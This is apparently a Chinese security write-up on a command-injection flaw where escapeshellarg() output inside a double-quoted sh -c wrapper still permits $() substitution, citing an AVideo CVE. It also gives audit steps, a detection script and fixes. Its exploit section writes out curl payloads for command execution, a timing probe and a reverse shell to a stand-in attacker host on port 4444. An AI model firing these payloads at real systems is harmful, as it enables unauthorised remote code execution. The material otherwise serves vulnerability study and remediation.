escapeshellarg安全假象：sh -c双引号中的命令替换注入 🔓

🎯 漏洞概述

escapeshellarg() 是PHP开发者防御命令注入的第一道防线——它给字符串加上单引号，内部单引号转义，看起来固若金汤。但当这个"安全"的参数被再次放入sh -c的双引号上下文时，一切防御化为乌有。

🎯 核心洞察：任何将已安全转义的数据重新放入更高层次的解释器上下文时，都可能重新引入注入。这不是某个函数的bug，而是防御层与执行层之间的语义断裂。

CVE-2026-64625（CVSS 9.8）揭示了AVideo平台中execAsync()函数的致命缺陷——一个CVE修补引入的二阶漏洞。

⚡ 攻击机制详解

让我们层层拆解这个攻击的原理。

第一层：escapeshellarg的设计意图

escapeshellarg() 的设计目的是让参数在单引号字符串中安全：

// escapeshellarg("test; id")
// 输出: 'test; id'
// 安全！分号在单引号中是普通字符

第二层：sh -c的双引号陷阱

但当开发者将转义后的参数放入sh -c的双引号中：

$param = $_GET['file'];
$escaped = escapeshellarg($param);  // 'user_input'
exec("sh -c \"ffmpeg -i $escaped output.mp4\"");  // 💥 危险！

在双引号"..."中，Bash会解析$()和反引号`为命令替换——这是Bash的正常行为，不是注入！

第三层：CVE修补引入的二阶漏洞

原始漏洞是无保护的命令拼接，修补方案加了escapeshellarg()但没改变sh -c包装。修补本身引入了新的漏洞——经典的安全修复反模式。

🔍 代码层面分析

AVideo的execAsync()函数处理视频转码任务：

// 漏洞代码路径
function execAsync($cmd) {
    // 设计为后台异步执行
    exec("sh -c \"$cmd\" > /dev/null 2>&1 &");
}

// 调用处
$file = escapeshellarg($_GET['file']);
execAsync("ffmpeg -i $file -c:v libx264 output.mp4");
// 等价于:
// exec('sh -c "ffmpeg -i \'user_input\' -c:v libx264 output.mp4"');
//                          ^^^^^^^^^^^^^
//                          单引号保护了内部内容
//                          但双引号中的 $() 仍被解析！

攻击payload：file=$(id)

// escapeshellarg("$(id)") → '$(id)'
// exec('sh -c "ffmpeg -i \'$(id)\' output.mp4"')
//                         ^^
// Bash在双引号中看到 $(id) → 执行命令替换
// 替换结果: 'uid=33(www-data) gid=33(www-data)...'
// 继续执行 ffmpeg -i 'uid=33...' output.mp4

💥 Exploit构造

实际攻击需要考虑转义层次：

# 基础RCE - 获取命令执行确认
curl 'http://target/download.php?file=$(id)'

# 从临时文件读取结果（避免ffmpeg报错丢失输出）
curl 'http://target/download.php?file=$(id>/tmp/pwned.txt)'

# 反弹Shell（通过bash -c）
curl 'http://target/download.php?file=$(bash+-c+"bash+-i+>%26+/dev/tcp/attacker/4444+0>%261")'

# 注意：URL编码很重要
# + = 空格, %26 = &
# 你的shell不要先解析 $() —— 用单引号包裹URL！

⚠️ 关键细节：在终端测试时，一定要用单引号包裹URL，否则你的shell会先解析$()！
curl 'http://target/?file=$(id)' ✅ 正确
curl "http://target/?file=$(id)" ❌ 本地shell先执行

🧠 通用攻击模型

这个漏洞揭示了一个超越PHP的通用安全反模式：

「信任边界递归跨越」模型

Layer 0: 用户输入        → "$(id)"
Layer 1: escapeshellarg  → '$(id)'    ← 安全边界建立
Layer 2: sh -c "..."     → 重新解释   ← 安全边界被跨越
Layer 3: bash命令替换    → 执行id     ← 攻击成功

每一层的安全保证只在当前层有效。当数据穿越到上层解释器时，安全上下文被重置。

同类漏洞案例

场景 安全层 被跨越的方式
PHP escapeshellarg + sh -c Shell转义 双引号命令替换
Python shlex.quote + shell=True Shell转义 subprocess的sh -c包装
SQL转义 + 动态拼接 SQL转义 二次SQL解释
HTML实体编码 + innerHTML XSS过滤 DOM解析重新解释

🔎 审计方法

系统化审计步骤：

# Step 1: 搜索 escapeshellarg/escapeshellcmd 使用
grep -rn 'escapeshellarg\|escapeshellcmd' --include='*.php' .

# Step 2: 检查是否有 sh -c 包装
grep -rn 'sh -c\|shell=True\|Popen.*shell' --include='*.php' --include='*.py' .

# Step 3: 交叉对比 — 同一代码路径是否同时出现
# 找到 escapeshellarg → 追踪变量 → 检查是否进入 sh -c 上下文

# Step 4: 测试注入
# 用 $(sleep 5) 做时间盲注
curl 'http://target/?file=$(sleep+5)'
# 测量响应时间 — 如果延迟5秒，确认注入成功

自动检测脚本

#!/usr/bin/env python3
"""检测 escapeshellarg + sh -c 组合漏洞"""
import re, sys, os

DANGEROUS_PATTERNS = [
    # PHP
    r'escapeshellarg.*sh\s+-c',
    r'escapeshellcmd.*sh\s+-c',
    # Python  
    r'shlex\.quote.*shell\s*=\s*True',
    r'subprocess\.(call|run|Popen).*shell\s*=\s*True',
    # Node.js
    r'child_process\.exec\(',
]

for root, dirs, files in os.walk(sys.argv[1] if len(sys.argv) > 1 else '.'):
    for f in files:
        if not any(f.endswith(ext) for ext in ['.php','.py','.js','.ts']):
            continue
        path = os.path.join(root, f)
        content = open(path).read()
        for pat in DANGEROUS_PATTERNS:
            for m in re.finditer(pat, content):
                print(f"[!] {path}: {m.group()} @ pos {m.start()}")

🛡️ 防御建议

正确的做法

// ❌ 错误：escapeshellarg + sh -c 双引号
$escaped = escapeshellarg($param);
exec("sh -c \"ffmpeg -i $escaped output.mp4\"");

// ✅ 正确：使用数组形式的 proc_open，完全绕过shell解释
$descriptors = [0=>['pipe','r'], 1=>['pipe','w'], 2=>['pipe','w']];
$proc = proc_open(
    ['ffmpeg', '-i', $param, '-c:v', 'libx264', 'output.mp4'],
    $descriptors, $pipes
);

// ✅ 正确：如果必须用shell，使用单引号且不做二次拼接
$cmd = sprintf('ffmpeg -i %s output.mp4', escapeshellarg($param));
exec($cmd);  // 没有 sh -c 包装

Python版本防御

# ❌ 错误
import shlex, subprocess
cmd = f"ffmpeg -i {shlex.quote(param)} output.mp4"
subprocess.Popen(cmd, shell=True)  # shell=True 使用 sh -c

# ✅ 正确
subprocess.Popen(
    ['ffmpeg', '-i', param, '-c:v', 'libx264', 'output.mp4'],
    shell=False  # 不经过shell解释
)

通用原则

🎯 防御原则：永远不要将已经过安全处理的数据重新放入更高层次的解释器。如果必须这样做，必须在新的层次重新做安全处理——但更好的做法是根本不要多层解释。
